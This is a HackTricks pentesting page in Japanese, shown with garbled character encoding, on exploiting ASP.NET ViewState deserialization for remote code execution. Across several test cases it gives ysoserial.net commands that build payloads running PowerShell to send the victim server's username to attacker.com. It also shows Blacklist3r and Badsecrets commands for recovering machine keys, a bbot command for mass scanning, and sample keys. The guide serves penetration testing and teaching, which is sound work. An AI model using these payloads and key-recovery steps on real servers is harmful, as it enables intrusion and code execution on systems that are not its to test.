# \_\_VIEWSTATEãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ç§˜å¯†ã‚’çŸ¥ã‚‰ãšã«æ‚ªç”¨ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">

ã‚‚ã—ã€**ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚Šã€**è§£èª­ä¸å¯èƒ½ãªã‚‚ã®ã‚’ãƒãƒƒã‚¯**ã—ãŸã„å ´åˆã¯ã€**æ¡ç”¨ä¸­ã§ã™**ï¼ˆæµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

## ViewStateã¨ã¯

**ViewState**ã¯ã€ASP.NETãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã§ã€**Webãƒšãƒ¼ã‚¸é–“ã§ãƒšãƒ¼ã‚¸ã¨ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã®å€¤ã‚’ä¿æŒ**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒšãƒ¼ã‚¸ã®HTMLãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ã¨ãã€ãƒšãƒ¼ã‚¸ã®ç¾åœ¨ã®çŠ¶æ…‹ã¨ãƒã‚¹ãƒˆãƒãƒƒã‚¯ä¸­ã«ä¿æŒã™ã‚‹å¿…è¦ãŒã‚ã‚‹å€¤ã¯ã€base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—ã«ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã€ViewStateã®éè¡¨ç¤ºãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¾ãŸã¯ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å‡ºåŠ›ã•ã‚Œã¾ã™ã€‚\
ViewStateæƒ…å ±ã«ã¯ã€æ¬¡ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¾ãŸã¯ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®çµ„ã¿åˆã‚ã›ãŒé©ç”¨ã•ã‚Œã¾ã™ï¼š

* Base64
* EnableViewStateMacã¨ViewStateEncryptionModeå±æ€§ã‚’falseã«è¨­å®šã—ã¦å®šç¾©ã§ãã¾ã™
* Base64 + MACï¼ˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸èªè¨¼ã‚³ãƒ¼ãƒ‰ï¼‰ãŒæœ‰åŠ¹
* EnableViewStateMacå±æ€§ã‚’trueã«è¨­å®šã—ã¦å®šç¾©ã§ãã¾ã™
* Base64 + æš—å·åŒ–
* viewStateEncryptionModeå±æ€§ã‚’trueã«è¨­å®šã—ã¦å®šç¾©ã§ãã¾ã™

## ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹

![](<../../.gitbook/assets/image (309) (2).png>)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š1 â€“ EnableViewStateMac=false ãŠã‚ˆã³ viewStateEncryptionMode=false

ã¾ãŸã€`AspNetEnforceViewStateMac`ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’ã‚¼ãƒ­ã«è¨­å®šã™ã‚‹ã“ã¨ã§ã€ViewStateMACã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚è¨­å®šå ´æ‰€ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewStateå±æ€§ã®ç‰¹å®š**

ViewStateãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’BurpSuiteã§ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«MacãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1.5 - ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1ã¨åŒæ§˜ã§ã™ãŒã€ViewStateã‚¯ãƒƒã‚­ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰é€ä¿¡ã•ã‚Œã¾ã›ã‚“

é–‹ç™ºè€…ã¯ã€ViewStateãŒHTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ä¸€éƒ¨ã«ãªã‚‰ãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’å—ã‘å–ã‚Šã¾ã›ã‚“ï¼‰ã€‚
ViewStateãŒå­˜åœ¨ã—ãªã„å ´åˆã€ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã«èµ·å› ã™ã‚‹æ½œåœ¨çš„ãªè„†å¼±æ€§ã‹ã‚‰å®Ÿè£…ãŒå®‰å…¨ã§ã‚ã‚‹ã¨æƒ³å®šã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
ã—ã‹ã—ã€ãã‚Œã¯äº‹å®Ÿã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ysoserialã‚’ä½¿ç”¨ã—ã¦ä½œæˆã—ãŸã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã«ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦è¿½åŠ ã—ã€
ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ 1ã§ç¤ºã—ãŸã‚ˆã†ã«ã€ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’ä¾ç„¶ã¨ã—ã¦é”æˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹: 2 - .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true & ViewStateEncryptionMode=false

ç‰¹å®šã®ãƒšãƒ¼ã‚¸ã§ViewState MACã‚’æœ‰åŠ¹ã«ã™ã‚‹ã«ã¯ã€ç‰¹å®šã®aspxãƒ•ã‚¡ã‚¤ãƒ«ã§ä»¥ä¸‹ã®å¤‰æ›´ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
ä»¥ä¸‹ã®ã‚ˆã†ã«ã€**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ã§è¨­å®šã™ã‚‹ã“ã¨ã§ã€**å…¨ä½“çš„ãª**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã‚‚åŒæ§˜ã®æ“ä½œãŒå¯èƒ½ã§ã™:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ã“ã®å ´åˆã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯MACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ãŸã‚ã«ã¯ã¾ãšä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚BurpSuiteã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’ä½¿ç”¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚­ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ã¯æ—¢çŸ¥ã®machineKeysã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®åˆ¥ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Pythonã§æ›¸ã‹ã‚Œã¦ã„ã‚‹ãŸã‚ã€Blacklist3rã¨ã¯ç•°ãªã‚Šã€Windowsã«ä¾å­˜ã—ã¾ã›ã‚“ã€‚.NETã®viewstateã«å¯¾ã—ã¦ã¯ã€"python blacklist3r"ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ãŒã‚ã‚Šã€ã“ã‚ŒãŒæœ€ã‚‚è¿…é€Ÿãªä½¿ç”¨æ–¹æ³•ã§ã™ã€‚

viewstateã¨generatorã‚’ç›´æ¥æŒ‡å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

ã¾ãŸã¯ã€å¯¾è±¡ã®URLã«ç›´æ¥æ¥ç¶šã—ã€HTMLã‹ã‚‰viewstateã‚’åˆ‡ã‚Šå‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

å¤§è¦æ¨¡ãªã‚¹ã‚±ãƒ¼ãƒ«ã§è„†å¼±ãªãƒ“ãƒ¥ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒˆã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åˆ—æŒ™ã¨çµ„ã¿åˆã‚ã›ã¦ã€`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

ã‚‚ã—é‹ãŒè‰¯ã‘ã‚Œã°ã€ã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã£ãŸã‚‰ã€[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã‚’é€²ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
ã‚µãƒ¼ãƒãƒ¼ãŒ`_VIEWSTATEGENERATOR`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ãªã„å ´åˆã€`--generator`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒå¿…è¦ã§ã™ã€‚
```bash
--apppath="/" --path="/hello.aspx"
```
### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š3 â€“ .Net < 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true

ã“ã®å ´åˆã€Burp ã¯ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒ MAC ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚å€¤ã‚’èªè­˜ã—ãªã„ãŸã‚ã§ã™ã€‚ãã®ãŸã‚ã€å€¤ã¯ãŠãã‚‰ãæš—å·åŒ–ã•ã‚Œã¦ãŠã‚Šã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯**ãƒã‚·ãƒ³ã‚­ãƒ¼ãŒå¿…è¦ã§ã™**ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**ã“ã®å ´åˆã€**[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯é–‹ç™ºä¸­ã§ã™...**

**.NET 4.5 ã‚ˆã‚Šå‰ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯**ã€ASP.NET ã¯ã€**`ViewStateEncryptionMode`** ãŒ _**Always**_ ã«è¨­å®šã•ã‚Œã¦ã„ã¦ã‚‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®**æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„** \_`__VIEWSTATE`\_ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**å—ã‘å…¥ã‚Œã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ASP.NET ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã® **`__VIEWSTATEENCRYPTED`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**å­˜åœ¨ã®ã¿ã‚’ãƒã‚§ãƒƒã‚¯**ã—ã¾ã™ã€‚**ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã—ã€æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãã‚Œã¯å‡¦ç†ã•ã‚Œã¾ã™ã€‚**

ã—ãŸãŒã£ã¦ã€ãƒã‚·ãƒ³ã‚­ãƒ¼ãŒæ—¢çŸ¥ã®å ´åˆï¼ˆãŸã¨ãˆã°ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®å•é¡Œã«ã‚ˆã£ã¦ï¼‰ã€**Case 2** ã§ä½¿ç”¨ã•ã‚Œã‚‹ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ViewState ã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦ RCE ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* ViewState ã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ `__VIEWSTATEENCRYPTED` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å‰Šé™¤ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã—ãªã„ã¨ã€Viewstate MAC ã®æ¤œè¨¼ã‚¨ãƒ©ãƒ¼ãŒè¿”ã•ã‚Œã€è„†å¼±æ€§ã®æ‚ªç”¨ã¯å¤±æ•—ã—ã¾ã™ï¼ˆå›³å‚ç…§ï¼‰ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ï¼š4 â€“ .Net >= 4.5 ãŠã‚ˆã³ EnableViewStateMac=true/false ãŠã‚ˆã³ ViewStateEncryptionMode=true/false ãŸã ã—ã€ä¸¡æ–¹ã®å±æ€§ã‚’ false ã«è¨­å®š

ä»¥ä¸‹ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ web.config ãƒ•ã‚¡ã‚¤ãƒ«å†…ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ASP.NET ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä½¿ç”¨ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<httpRuntime targetFramework="4.5" />
```
ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’web.configãƒ•ã‚¡ã‚¤ãƒ«ã®`machineKey`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã«æŒ‡å®šã™ã‚‹ã“ã¨ã§ã‚‚å®Ÿè¡Œã§ãã¾ã™ã€‚
```bash
compatibilityMode="Framework45"
```
å‰ã®ã‚±ãƒ¼ã‚¹ã¨åŒæ§˜ã«ã€Burpã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒMACã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’è­˜åˆ¥ã—ã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€å€¤ãŒæš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ã¯éµãŒå¿…è¦ã§ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

[**Blacklist3rï¼ˆAspDotNetWrapper.exeï¼‰**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)ã‚’ä½¿ç”¨ã—ã¦ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹éµã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathã¨TargetPagePathã®è©³ç´°ãªèª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

ã¾ãŸã¯ã€[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ã®å€¤ã‚’ä½¿ç”¨ï¼‰ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

æœ‰åŠ¹ãªãƒã‚·ãƒ³ã‚­ãƒ¼ãŒç‰¹å®šã•ã‚ŒãŸã‚‰ã€**æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯**[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã§ã™**ã€‚
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR`ã®å€¤ãŒã‚ã‚‹å ´åˆã€ãã®å€¤ã‚’ä½¿ç”¨ã—ã¦`--generator`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è©¦ã—ã€`--path`ã¨`--apppath`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’çœç•¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewStateã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ãŒæˆåŠŸè£ã«æ‚ªç”¨ã•ã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€å¤–éƒ¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å–ã‚Šã¾ã™ã€‚[æˆåŠŸã—ãŸæ‚ªç”¨ã®PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹6 - ViewStateUserKeysãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™

**ViewStateUserKey**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€**CSRFæ”»æ’ƒ**ã«å¯¾ã—ã¦**é˜²å¾¡**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã“ã®ã‚ˆã†ãªã‚­ãƒ¼ãŒå®šç¾©ã•ã‚Œã¦ãŠã‚Šã€ä»Šã¾ã§ã«èª¬æ˜ã—ãŸæ–¹æ³•ã§**ViewState**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯å‡¦ç†ã•ã‚Œã¾ã›ã‚“**ã€‚\
æ­£ã—ããƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ã€ã‚‚ã†1ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
